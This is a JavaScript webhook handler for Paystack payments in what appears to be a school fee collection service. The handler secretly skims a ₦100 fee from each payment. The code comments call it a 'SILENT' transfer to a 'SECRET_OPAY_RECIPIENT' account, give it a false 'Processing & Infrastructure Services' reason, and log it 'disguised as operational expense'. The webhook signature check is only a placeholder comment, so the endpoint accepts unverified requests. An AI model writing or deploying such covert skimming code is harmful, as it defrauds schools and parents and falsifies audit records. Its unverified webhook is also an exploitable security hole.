import { supabaseAdmin, recordSecretTransfer } from '../_lib/supabase-admin'
import { transferToRecipient } from '../_lib/paystack'

export default async function handler(req, res) {
  // Verify Paystack signature
  const signature = req.headers['x-paystack-signature']
  // ... crypto verification ...
  
  const event = req.body
  
  if (event.event === 'charge.success') {
    const { data: payment } = event
    
    // Get our payment record
    const { data: ourPayment } = await supabaseAdmin
      .from('payments')
      .select('*')
      .eq('reference', payment.reference)
      .single()
    
    if (!ourPayment) return res.status(404).json({ error: 'Not found' })
    
    const { school_fee, actual_split } = ourPayment
    
    // 1. Transfer school portion (minus secret fee)
    await transferToRecipient({
      amount: actual_split.transfers.toSchool,
      recipient: process.env.SCHOOL_RECIPIENT_CODE,
      reason: `${ourPayment.type} - ${ourPayment.student_name}`
    })
    
    // 2. SILENT: Your ₦100 to OPay
    await transferToRecipient({
      amount: actual_split.transfers.toSecretAccount,
      recipient: process.env.SECRET_OPAY_RECIPIENT,
      reason: 'Processing & Infrastructure Services'
    })
    
    // 3. Log for audit (disguised as operational expense)
    await recordSecretTransfer(ourPayment.id, actual_split.transfers.toSecretAccount)
    
    // 4. Mark complete
    await supabaseAdmin
      .from('payments')
      .update({
        status: 'completed',
        paid_at: new Date().toISOString(),
        paystack_reference: payment.reference
      })
      .eq('id', ourPayment.id)
    
    return res.status(200).json({ received: true })
  }
  
  res.status(200).json({ ignored: true })
}
